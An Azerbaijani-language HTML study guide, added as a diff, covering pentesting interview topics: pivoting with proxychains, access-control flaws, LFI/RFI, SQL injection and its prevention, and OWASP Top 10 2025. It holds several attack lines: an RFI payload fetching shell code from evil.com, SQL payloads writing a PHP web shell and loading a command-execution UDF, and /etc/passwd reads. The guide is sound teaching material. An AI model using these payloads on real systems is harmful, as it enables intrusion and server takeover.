+<p>Proxy – səninlə internet arasında duran vasitəçi serverdir (Sən → Proxy → Website). Məqsəd: IP gizlətmək, filter bypass, logging, cache.</p>
+<p>SOCKS Proxy – daha aşağı səviyyədə işləyən, istənilən trafiki (HTTP, SMB, RDP, SSH) ötürə bilən proxy. HTTP proxy yalnız web traffic dəstəkləyir, SOCKS isə bütün traffic-i. Pentestdə pivot üçün əsasdır (proxychains ilə).</p>
+<p>Reverse Proxy – client-lərin qarşısında duran və request-ləri backend serverlərə yönləndirən serverdir (Client → Reverse Proxy → Backend). Məqsəd: load balancing, backend gizlətmək, SSL termination, caching (Nginx, HAProxy, Cloudflare).</p>
+<ul class="blist">
+<li>Proxy: client tərəf, HTTP, IP gizlətmək.</li>
+<li>SOCKS Proxy: client tərəf, hamısı, pivoting (çox vacib).</li>
+<li>Reverse Proxy: server tərəf, HTTP/HTTPS, load balancing.</li>
+</ul>
+</div></article>
+<article class="qa" id="q135">
+<div class="qa-q"><span class="badge">Sual 135</span><h3>Remote Port Forwarding nədir?</h3></div>
+<div class="qa-a">
+<p>Remote Port Forwarding – target sənin kompüterinə port açır (Remote/Target → Local/Kali). NAT/firewall arxasında reverse access üçün.</p>
+<p>Ssenari: Kali çöldə, target içdə (NAT arxasında), birbaşa girə bilmirsən. Target reverse tunnel ilə öz portunu sənin tərəfə açır (məs: Target 3389 → Kali 4444). Sən Kali-də 4444-ə girəndə əslində target-in RDP-si açılır.</p>
+<p>Sadə dillə: içdəki maşın çölə çıxış verir. İstifadə: RDP access, internal service exposure, firewall bypass.</p>
+</div></article>
+<article class="qa" id="q136">
+<div class="qa-q"><span class="badge">Sual 136</span><h3>Dynamic Port Forwarding (SOCKS Proxy) nədir?</h3></div>
+<div class="qa-a">
+<p>Dynamic Port Forwarding – bir port açırsan və bütün trafik oradan keçir; proxy kimi işləyir (ən güclü variant).</p>
+<p>Ssenari: bir foothold aldın (web server), iç şəbəkə 10.10.10.0/24, birbaşa scan edə bilmirsən. SOCKS proxy qurursan (Kali → SOCKS → Internal Network). İndi sanki iç şəbəkədəsən kimi davranırsan.</p>
+<pre class="code"><code>proxychains nmap 10.10.10.5</code></pre>
+<pre class="code"><code>proxychains firefox http://10.10.10.5</code></pre>
+<pre class="code"><code>proxychains crackmapexec smb 10.10.10.0/24</code></pre>
+<ul class="blist">
+<li>Remote forwarding: 1 port/1 xidmət, spesifik giriş.</li>
+<li>Dynamic (SOCKS): full network access, scan + attack + browse, pivoting üçün əsas silah.</li>
+</ul>
+<p>Red team flow: foothold → shell → SOCKS proxy → proxychains scan → internal host-lar → lateral movement. (Tunnel alətləri: SSH, Chisel.)</p>
+</div></article>
+</section>
+<section class="cat-section" id="cat8">
+<header class="cat-head"><span class="cat-head-num">08</span><h2>Giriş Nəzarəti Modelləri və Fayl Inclusion</h2></header>
+<div class="note"><span class="note-label">Qeyd</span><p>Bu bölmə “ACCESS CONTROL &amp; FILE INCLUSION” qeydləri əsasında hazırlanıb. Giriş nəzarəti zəiflikləri (IDOR, BOLA, MFLAC, BFLA), giriş nəzarəti modelləri (MAC, DAC, RBAC, RB-RBAC, ABAC) və fayl inclusion (LFI, RFI) burada toplanıb. Əsas məntiq: “Login olmaq = icazə almaq deyil.”</p></div>
+<article class="qa" id="q137">
+<div class="qa-q"><span class="badge">Sual 137</span><h3>IDOR (Insecure Direct Object Reference) nədir?</h3></div>
+<div class="qa-a">
+<p>IDOR – istifadəçinin özünə aid olmayan resursa sadəcə ID-ni dəyişdirərək daxil ola bilməsi zəifliyidir. Sistem “ID düzgündürsə icazə ver” deyir, amma “bu ID bu istifadəçiyə məxsusdurmu?” sualını vermir.</p>
+<h4 class="sub">Niyə yaranır?</h4>
+<ul class="blist">
+<li>Backend yalnız “login olubmu?” yoxlayır, obyekt sahibliyini (ownership) yoxlamır.</li>
+<li>ID-lər təxmin ediləndir (1, 2, 3...).</li>
+<li>Authorization obyekt səviyyəsində yazılmayıb; frontend-ə güvənilir (“link gizlidir”).</li>
+</ul>
+<h4 class="sub">Nümunə</h4>
+<pre class="code"><code>GET /profile?id=101   -&gt; sənin profilin
+GET /profile?id=102   -&gt; başqasının profili (IDOR)</code></pre>
+</div></article>
+<article class="qa" id="q138">
+<div class="qa-q"><span class="badge">Sual 138</span><h3>BOLA (Broken Object Level Authorization) nədir?</h3></div>
+<div class="qa-a">
+<p>BOLA – IDOR-un API versiyasıdır; OWASP API zəiflikləri üçün ayrıca belə adlandırıb. API token-i etibarlıdır, amma resursun sahibi yoxlanmır.</p>
+<h4 class="sub">Tipik səhv</h4>
+<ul class="blist">
+<li>Token valid? → bəli → cavabı qaytar. Amma order.user_id == token.user_id yoxlanmır.</li>
+</ul>
+<h4 class="sub">Nümunə</h4>
+<pre class="code"><code>GET /api/orders/555
+Authorization: Bearer USER_TOKEN
+-&gt; sifariş başqasınındır, amma açılır (BOLA)</code></pre>
+</div></article>
+<article class="qa" id="q139">
+<div class="qa-q"><span class="badge">Sual 139</span><h3>MFLAC (Missing Function Level Access Control) nədir?</h3></div>
+<div class="qa-a">
+<p>MFLAC – istifadəçinin icazəsi olmadığı bir funksiyanı (endpoint, action) birbaşa çağıraraq işlədə bilməsi zəifliyidir. Sistem “bu funksiyanı kim çağıra bilər?” sualını yoxlamır.</p>
+<h4 class="sub">Niyə yaranır?</h4>
+<ul class="blist">
+<li>Admin düyməsi yalnız frontend-də gizlədilir; backend endpoint-i çağıran kimi icra edir.</li>
+<li>“Bu istifadəçi bu funksiyanı icra edə bilərmi?” yoxlaması yoxdur.</li>
+</ul>
+<h4 class="sub">Nümunə</h4>
+<pre class="code"><code>POST /admin/deleteUser
+-&gt; normal user çağırır, istifadəçi silinir (MFLAC)</code></pre>
+</div></article>
+<article class="qa" id="q140">
+<div class="qa-q"><span class="badge">Sual 140</span><h3>BFLA (Broken Function Level Authorization) nədir?</h3></div>
+<div class="qa-a">
+<p>BFLA – MFLAC-in OWASP terminidir; məntiq tamamilə eynidir. Rol və icazə yoxlanmadığı üçün “admin” endpoint-i hər kəsə açıq qalır.</p>
+<h4 class="sub">Nümunə</h4>
+<pre class="code"><code>PUT /api/admin/promoteUser
+-&gt; normal user özünü admin edir (BFLA)</code></pre>
+<h4 class="sub">Qızıl ayrım</h4>
+<ul class="blist">
+<li>IDOR / BOLA → obyekt səviyyəsində problem.</li>
+<li>MFLAC / BFLA → funksiya (endpoint) səviyyəsində problem.</li>
+</ul>
+</div></article>
+<article class="qa" id="q141">
+<div class="qa-q"><span class="badge">Sual 141</span><h3>MAC (Mandatory Access Control) nədir?</h3></div>
+<div class="qa-a">
+<p>MAC – istifadəçinin deyil, sistem siyasətinin qərar verdiyi giriş nəzarəti modelidir. Hərbi və kritik sistemlərdə istifadə olunur, çünki insana güvən minimuma endirilir.</p>
+<ul class="blist">
+<li>Top Secret sənədə istifadəçi istəsə də icazəni dəyişə bilməz.</li>
+<li>Bu səbəbdən MAC mühitində IDOR kimi zəifliklər daha az olur.</li>
+</ul>
+</div></article>
+<article class="qa" id="q142">
+<div class="qa-q"><span class="badge">Sual 142</span><h3>DAC (Discretionary Access Control) nədir?</h3></div>
+<div class="qa-a">
+<p>DAC – obyektin sahibinin kimə nə icazə verəcəyinə özünün qərar verdiyi modeldir. Çevikdir, amma insan səhvinə açıqdır.</p>
+<ul class="blist">
+<li>Səhv konfiqurasiya (məs: “Everyone: Full Access”) data sızması və IDOR riski yaradır.</li>
+</ul>
+</div></article>
+<article class="qa" id="q143">
+<div class="qa-q"><span class="badge">Sual 143</span><h3>RBAC (Role-Based Access Control) nədir?</h3></div>
+<div class="qa-a">
+<p>RBAC – icazənin istifadəçiyə birbaşa deyil, onun roluna görə verildiyi modeldir (məs: admin, user, editor).</p>
+<h4 class="sub">Niyə BFLA / MFLAC yaranır?</h4>
+<ul class="blist">
+<li>Rol yalnız frontend-də yoxlanır; backend-də “if role == admin” yoxlaması olmur.</li>
+</ul>
+</div></article>
+<article class="qa" id="q144">
+<div class="qa-q"><span class="badge">Sual 144</span><h3>RB-RBAC (Rule-Based RBAC) nədir?</h3></div>
+<div class="qa-a">
+<p>RB-RBAC – RBAC üzərinə şərtlər (qaydalar) əlavə edən modeldir. Rol tək başına yetmədikdə vaxt, yer, filial kimi şərtlər də nəzərə alınır.</p>
+<ul class="blist">
+<li>Məsələn: “Kassir yalnız iş saatında və yalnız öz filialından əməliyyat edə bilər.”</li>
+</ul>
+</div></article>
+<article class="qa" id="q145">
+<div class="qa-q"><span class="badge">Sual 145</span><h3>ABAC (Attribute-Based Access Control) nədir?</h3></div>
+<div class="qa-a">
+<p>ABAC – istifadəçi, resurs, əməliyyat və mühit atributlarına baxaraq icazə verən giriş nəzarəti modelidir. RBAC “rolun nədir?” soruşur; ABAC isə “hər detalı de, sonra qərar verim” deyir.</p>
+<h4 class="sub">4 əsas atribut qrupu</h4>
+<ul class="blist">
+<li><strong>Subject (istifadəçi):</strong> user_id, role, department, age, clearance_level.</li>
+<li><strong>Resource (resurs):</strong> file_owner, classification (public/confidential), file_type.</li>
+<li><strong>Action (əməliyyat):</strong> read, write, delete, approve.</li>
+<li><strong>Environment (mühit):</strong> IP, ölkə, vaxt (iş saatı/gecə), cihaz (VPN, şirkət laptopu).</li>
+</ul>
+<h4 class="sub">Risk</h4>
+<ul class="blist">
+<li>Policy səhv yazılsa və ya bir atribut unudulsa, yenə IDOR / BOLA tipli zəifliklər yaranır.</li>
+</ul>
+</div></article>
+<article class="qa" id="q146">
+<div class="qa-q"><span class="badge">Sual 146</span><h3>LFI (Local File Inclusion) nədir?</h3></div>
+<div class="qa-a">
+<p>LFI – istifadəçi inputunun serverdəki lokal faylı include etməsinə imkan verən zəiflikdir. İnput yoxlanmadıqda yaranır (məs: include($_GET[&#x27;page&#x27;])).</p>
+<h4 class="sub">Nümunə</h4>
+<pre class="code"><code>?page=../../../../etc/passwd
+-&gt; serverin daxili faylları açılır</code></pre>
+</div></article>
+<article class="qa" id="q147">
+<div class="qa-q"><span class="badge">Sual 147</span><h3>RFI (Remote File Inclusion) nədir?</h3></div>
+<div class="qa-a">
+<p>RFI – uzaqdakı (xarici) faylın serverdə icra olunmasına imkan verən zəiflikdir. allow_url_include = On olduqda və URL filtri olmadıqda yaranır.</p>
+<h4 class="sub">Nümunə</h4>
+<pre class="code"><code>?page=http://evil.com/shell.txt
+-&gt; full takeover riski</code></pre>
+<h4 class="sub">Niyə bütün bunlar yaranır?</h4>
+<ul class="blist">
+<li>Backend authorization zəifdir, frontend-ə güvənilir.</li>
+<li>İstifadəçi inputuna inanılır.</li>
+<li>Təhlükəsizlik dizayn mərhələsində deyil, sonda yada düşür.</li>
+</ul>
+</div></article>
+</section>
+<section class="cat-section" id="cat9">
+<header class="cat-head"><span class="cat-head-num">09</span><h2>SQL Injection — Database Portları, Reverse Shell və Müdafiə</h2></header>
+<div class="note"><span class="note-label">Qeyd</span><p>Bu bölmə “SQL Injection ilə Reverse Shell Alma Texnikaları” qeydləri əsasında hazırlanıb. Database default portları, SQLi vasitəsilə kod icrası texnikaları (yalnız səlahiyyətli/lab mühiti üçün) və müdafiə (prevention) metodları toplanıb. SQLi-nin əsasları üçün bax: Bölmə 5, Sual 56–62.</p></div>
+<article class="qa" id="q148">
+<div class="qa-q"><span class="badge">Sual 148</span><h3>Əsas database default portları hansılardır?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Relational (əlaqəli) DB-lər</h4>
+<ul class="blist">
+<li>MySQL / MariaDB – 3306 (TCP).</li>
+<li>PostgreSQL – 5432 (TCP).</li>
+<li>Microsoft SQL Server – 1433 (TCP), 1434 (UDP browser).</li>
+<li>Oracle DB / TNS Listener – 1521 (TCP).</li>
+<li>IBM DB2 – 50000 (TCP).</li>
+<li>Sybase ASE – 5000 (TCP); SAP HANA – 39013 / 39015 (TCP).</li>
+<li>SQLite – port yoxdur (file-based).</li>
+</ul>
+<h4 class="sub">NoSQL DB-lər</h4>
+<ul class="blist">
+<li>MongoDB – 27017 (shard/replicaset: 27018, 27019).</li>
+<li>Redis – 6379; CouchDB – 5984; InfluxDB – 8086.</li>
+<li>Apache Cassandra – 9042 (CQL), 7000 (cluster), 7001 (SSL).</li>
+<li>Elasticsearch – 9200 (HTTP), 9300 (transport).</li>
+<li>Neo4j – 7474 (HTTP), 7687 (Bolt); Couchbase – 8091 (web), 11210 (data).</li>
+<li>RethinkDB – 8080 (web UI), 28015 (client), 29015 (cluster).</li>
+</ul>
+<h4 class="sub">Admin panel / GUI portları</h4>
+<ul class="blist">
+<li>phpMyAdmin – 80 / 443; pgAdmin – 5050; Adminer – 8080.</li>
+<li>MongoDB Compass – 27017; Redis Commander – 8081.</li>
+</ul>
+</div></article>
+<article class="qa" id="q149">
+<div class="qa-q"><span class="badge">Sual 149</span><h3>SQL Injection ilə kod icrası (reverse shell) texnikaları hansılardır?</h3></div>
+<div class="qa-a">
+<p>Diqqət: Aşağıdakılar yalnız öz laboratoriyanda və ya yazılı icazəli pentest mühitində istifadə üçündür. İcazəsiz sistemlərdə tətbiqi qanunsuzdur.</p>
+<h4 class="sub">1) INTO OUTFILE ilə web shell yazmaq</h4>
+<p>Yalnız DB istifadəçisinin FILE səlahiyyəti olduqda mümkündür. MySQL nümunəsi:</p>
+<pre class="code"><code>SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;
+INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;;</code></pre>
+<p>Sonra fayl web server üzərindən çağırılır (məs: shell.php?cmd=id).</p>
+<h4 class="sub">2) UNION ilə web shell yazmaq</h4>
+<pre class="code"><code>UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;
+INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;</code></pre>
+<h4 class="sub">3) MySQL UDF (User Defined Function) ilə əmr icrası</h4>
+<p>Güclü texnikadır: .so faylı plugin qovluğuna yazılır, sonra funksiya yaradılır.</p>
+<pre class="code"><code>CREATE FUNCTION sys_exec RETURNS INTEGER
+SONAME &#x27;lib_mysqludf_sys.so&#x27;;</code></pre>
+<h4 class="sub">4) MySQL LOAD_FILE() ilə fayl oxuma</h4>
+<p>Reverse shell deyil, amma LFI + RCE zəncirində istifadə olunur:</p>
+<pre class="code"><code>SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;);</code></pre>
+</div></article>
+<article class="qa" id="q150">
+<div class="qa-q"><span class="badge">Sual 150</span><h3>SQL Injection-un qarşısı necə alınır (prevention metodları)?</h3></div>
+<div class="qa-a">
+<h4 class="sub">1) Prepared Statements (parametrli sorğular)</h4>
+<p>Ən təhlükəsiz və ən çox tövsiyə olunan metoddur: SQL sorğusu və istifadəçi inputu ayrı işlənir.</p>
+<pre class="code"><code># Zəif:
+SELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;;
+# Təhlükəsiz:
+SELECT * FROM users WHERE username = ? AND password = ?</code></pre>
+<h4 class="sub">2) Input Validation</h4>
+<p>İnput qəbul edilməzdən əvvəl yoxlanır. Məsələn istifadəçi adı üçün yalnız hərf/rəqəm: ^[a-zA-Z0-9_]+$ . Beləliklə &#x27;, --, OR 1=1, UNION kimi payloadlar bloklanır.</p>
+<h4 class="sub">3) Escaping</h4>
+<ul class="blist">
+<li>Xüsusi simvollar (&#x27;, &quot;, \, ;) escape edilir.</li>
+</ul>
+<h4 class="sub">4) Least Privilege</h4>
+<p>DB istifadəçisinə minimum səlahiyyət verilir (məs: root yox, yalnız SELECT). Bu zaman DROP, DELETE, FILE, xp_cmdshell kimi əmrlər işləməz.</p>
+<h4 class="sub">5) Web Application Firewall (WAF)</h4>
+<ul class="blist">
+<li>UNION SELECT, OR 1=1, SLEEP() kimi payloadları bloklayır (Cloudflare, ModSecurity, AWS WAF, Imperva).</li>
+</ul>
+<h4 class="sub">6) Error mesajlarını gizlətmək</h4>
+<ul class="blist">
+<li>SQL səhvləri istifadəçiyə göstərilməməlidir; “Something went wrong” kifayətdir.</li>
+</ul>
+<h4 class="sub">7) Query Allowlisting</h4>
+<ul class="blist">
+<li>Yalnız icazə verilən sorğular işləməli (SELECT/INSERT/UPDATE); DROP/ALTER/UNION bloklana bilər.</li>
+</ul>
+<h4 class="sub">8) Monitoring və Logging</h4>
+<ul class="blist">
+<li>Şübhəli sorğular (UNION SELECT, SLEEP, BENCHMARK) izlənir və alert yaradır.</li>
+</ul>
+<h4 class="sub">Ən effektiv 3 müdafiə</h4>
+<ul class="blist">
+<li>Prepared Statements, Input Validation, Least Privilege.</li>
+</ul>
+</div></article>
+</section>
+<section class="cat-section" id="cat10">
+<header class="cat-head"><span class="cat-head-num">10</span><h2>OWASP Top 10 — 2025</h2></header>
+<div class="note"><span class="note-label">Qeyd</span><p>Bu bölmə OWASP Top 10 — 2025 qeydləri əsasında hazırlanıb. Hər kateqoriya qısa məntiq, tipik nümunələr və real həyat analogiyası ilə izah olunub. Sonda 2021 → 2025 dəyişiklikləri verilib.</p></div>
+<article class="qa" id="q151">
+<div class="qa-q"><span class="badge">Sual 151</span><h3>OWASP Top 10 — 2025 siyahısı nədir və hər kateqoriya nəyi əhatə edir?</h3></div>
+<div class="qa-a">
+<h4 class="sub">A01:2025 — Broken Access Control</h4>
+<p>Məntiq: “Görməməli/etməməli olduğum şeyi edə bilirəmsə → problem var.”</p>
+<ul class="blist">
+<li>IDOR, horizontal/vertical privilege escalation, force browsing (/admin/dashboard).</li>
+<li>Real həyat: kassir olmadığın halda kassanın arxasına keçə bilirsən.</li>
+</ul>
+<h4 class="sub">A02:2025 — Security Misconfiguration</h4>
+<p>Məntiq: “Sistem düzgün bağlanmayıb.”</p>
+<ul class="blist">
+<li>Default config (admin/admin), açıq admin panel, debug mode ON, səhv CORS (*), açıq cloud storage (S3 bucket).</li>
+<li>Real həyat: qapı var, amma kilidlənməyib.</li>
+</ul>
+<h4 class="sub">A03:2025 — Software Supply Chain Failures</h4>
+<p>Məntiq: “Sən yox, istifadə etdiyin paket səni satır.”</p>
+<ul class="blist">
+<li>Zəif/poisoned dependency, CI/CD compromise (token oğurlanması), unsigned update.</li>
+<li>Real həyat: yeməyi aşpaz bişirir və zəhər qatır.</li>
+</ul>
+<h4 class="sub">A04:2025 — Cryptographic Failures</h4>
+<p>Məntiq: “Məlumat var, amma qorunmur.”</p>
+<ul class="blist">
+<li>Plaintext password, zəif hashing (MD5), hard-coded key, HTTPS olmaması.</li>
+<li>Real həyat: seyf var, amma açarı üstünə yapışdırılıb.</li>
+</ul>
+<h4 class="sub">A05:2025 — Injection</h4>
+<p>Məntiq: “Sistem inputa kor-koranə inanır.” (Qeyd: 2021-də A03 idi.)</p>
+<ul class="blist">
+<li>SQL Injection (&#x27; OR 1=1 --), OS Command Injection (; whoami), SSTI ({{7*7}}).</li>
+<li>Real həyat: kassirə “pul ver” yox, “kassanı boşalt” deyirsən.</li>
+</ul>
+<h4 class="sub">A06:2025 — Insecure Design</h4>
+<p>Məntiq: “Kod düzgündür, dizayn səhvdir.”</p>
+<ul class="blist">
+<li>Threat modeling yoxdur, rate limit yoxdur (sonsuz OTP), business logic flaw, trust boundary error.</li>
+<li>Real həyat: qapı möhkəmdir, amma evin arxası açıqdır.</li>
+</ul>
+<h4 class="sub">A07:2025 — Authentication Failures</h4>
+<p>Məntiq: “Kim olduğunu sübut etmə mexanizmi zəifdir.”</p>
+<ul class="blist">
+<li>Weak password, brute-force qorunması yoxdur, session fixation, MFA yoxdur.</li>
+<li>Real həyat: qapı var, amma hər kəsə eyni açar verilib.</li>
+</ul>
+<h4 class="sub">A08:2025 — Software or Data Integrity Failures</h4>
+<p>Məntiq: “Kod və data dəyişdirilir, sistem yoxlamır.”</p>
+<ul class="blist">
+<li>Unsigned updates, insecure deserialization (object içində RCE), zəif qorunan CI/CD.</li>
+<li>Real həyat: paket gəlir, açmadan qəbul edirsən.</li>
+</ul>
+<h4 class="sub">A09:2025 — Security Logging &amp; Alerting Failures</h4>
+<p>Məntiq: “Hücum olur, amma sən bilmirsən.”</p>
+<ul class="blist">
+<li>Login fail loglanmır, alert/SIEM yoxdur, loglar silinə bilir.</li>
+<li>Real həyat: oğru girir, kamera var, amma işləmir.</li>
+</ul>
+<h4 class="sub">A10:2025 — Mishandling of Exceptional Conditions</h4>
+<p>Məntiq: “Xəta olanda sistem nə edəcəyini bilmir.” (2025-də yeni kateqoriya.)</p>
+<ul class="blist">
+<li>Fail-open (auth server down → hamı girir), stack trace leak, gözlənilməz inputda crash.</li>
+<li>Real həyat: işıqlar sönəndə qapılar avtomatik açılır.</li>
+</ul>
+<h4 class="sub">Qısa cheat</h4>
+<ul class="blist">
+<li>A01 kim nə edə bilər · A02 yanlış qurulum · A03 dependency xəyanəti · A04 şifrələmə zəif · A05 input hücumu.</li>
+<li>A06 dizayn səhvi · A07 login zəif · A08 integrity yoxlanmır · A09 heç nə izlənmir · A10 error → xaos.</li>
+</ul>
+</div></article>
+<article class="qa" id="q152">
+<div class="qa-q"><span class="badge">Sual 152</span><h3>OWASP Top 10 — 2021 və 2025 arasında nə dəyişdi?</h3></div>
+<div class="qa-a">
+<h4 class="sub">2021 siyahısı</h4>
+<ul class="blist">
+<li>A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection · A04 Insecure Design · A05 Security Misconfiguration.</li>
+<li>A06 Vulnerable and Outdated Components · A07 Identification and Authentication Failures · A08 Software and Data Integrity Failures · A09 Security Logging and Monitoring Failures · A10 SSRF.</li>
+</ul>
+<h4 class="sub">2025 siyahısı</h4>
+<ul class="blist">
+<li>A01 Broken Access Control · A02 Security Misconfiguration · A03 Software Supply Chain Failures · A04 Cryptographic Failures · A05 Injection.</li>
+<li>A06 Insecure Design · A07 Authentication Failures · A08 Software or Data Integrity Failures · A09 Security Logging and Alerting Failures · A10 Mishandling of Exceptional Conditions.</li>
+</ul>
+<h4 class="sub">Əsas dəyişikliklər</h4>
+<ul class="blist">
+<li>Security Misconfiguration A05 → A02-yə qalxdı (daha yüksək risk).</li>
+<li>Injection A03 → A05-ə endi.</li>
+<li>“Vulnerable and Outdated Components” daha geniş “Software Supply Chain Failures” (A03) kimi yenidən təsnif olundu.</li>
+<li>SSRF ayrıca kateqoriya kimi çıxarıldı; “Mishandling of Exceptional Conditions” (A10) yeni kateqoriya kimi əlavə olundu.</li>
+</ul>
+</div></article>
+</section>
+  </div>
+</main>
+
+<button class="backtop" id="backtop" aria-label="Yuxarı">↑</button>
+
+<script>
+const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
+
+/* expand/collapse categories */
+$$('.cat-btn').forEach(btn=>{
+  btn.addEventListener('click',e=>{
+    const li=btn.closest('.nav-cat');
+    const open=li.classList.toggle('open');
+    btn.setAttribute('aria-expanded',open);
+  });
+});
+
+/* smooth scroll + close mobile nav */
+$$('.q-list a').forEach(a=>{
+  a.addEventListener('click',e=>{
+    document.body.classList.remove('nav-open');
+  });
+});
+
+/* scroll-spy: highlight active question, auto-open its category */
+const links=new Map(); $$('.q-list a').forEach(a=>links.set(a.dataset.q,a));
+const obs=new IntersectionObserver(entries=>{
+  entries.forEach(en=>{
+    if(en.isIntersecting){
+      const id=en.target.id, link=links.get(id);
+      if(!link) return;
+      $$('.q-list a.active').forEach(x=>x.classList.remove('active'));
+      link.classList.add('active');
+      const li=link.closest('.nav-cat');
+      if(li && !li.classList.contains('open')){
+        $$('.nav-cat.open').forEach(o=>{o.classList.remove('open');o.querySelector('.cat-btn').setAttribute('aria-expanded',false);});
+        li.classList.add('open'); li.querySelector('.cat-btn').setAttribute('aria-expanded',true);
+      }
+      link.scrollIntoView({block:'nearest'});
+    }
+  });
+},{rootMargin:'-15% 0px -70% 0px',threshold:0});
+$$('.qa').forEach(q=>obs.observe(q));
+
+/* search filter */
+const search=$('#search'), noRes=$('#noResult');
+search.addEventListener('input',()=>{
+  const term=search.value.trim().toLowerCase();
+  let any=false;
+  $$('.nav-cat').forEach(cat=>{
+    let catMatch=false;
+    cat.querySelectorAll('.q-list li').forEach(li=>{
+      const txt=li.innerText.toLowerCase();
+      const hit=!term||txt.includes(term);
+      li.style.display=hit?'':'none';
+      if(hit&&term) catMatch=true;
+    });
+    const cname=cat.querySelector('.cat-name').innerText.toLowerCase();
+    const show=!term||catMatch||cname.includes(term);
+    cat.style.display=show?'':'none';
+    if(show) any=true;
+    if(term&&(catMatch)) {cat.classList.add('open');cat.querySelector('.cat-btn').setAttribute('aria-expanded',true);}
+    if(!term) {cat.classList.remove('open');cat.querySelector('.cat-btn').setAttribute('aria-expanded',false);}
+  });
+  noRes.hidden=any;
+});
+
+/* mobile menu */
+$('#menuBtn').addEventListener('click',()=>document.body.classList.toggle('nav-open'));
+$('#scrim').addEventListener('click',()=>document.body.classList.remove('nav-open'));
+
+/* back to top */
+const bt=$('#backtop');
+addEventListener('scroll',()=>{bt.classList.toggle('show',scrollY>700);});
+bt.addEventListener('click',()=>scrollTo({top:0,behavior:'smooth'}));
+
+/* open category on load if URL has hash */
+function openHash(){
+  const h=location.hash.slice(1); if(!h) return;
+  const link=links.get(h); if(link){const li=link.closest('.nav-cat');li.classList.add('open');li.querySelector('.cat-btn').setAttribute('aria-expanded',true);}
+}
+openHash(); addEventListener('hashchange',openHash);
+/* open first category by default */
+if(!location.hash){const f=$('.nav-cat');if(f){f.classList.add('open');f.querySelector('.cat-btn').setAttribute('aria-expanded',true);}}
+</script>
+</body>
+</html>
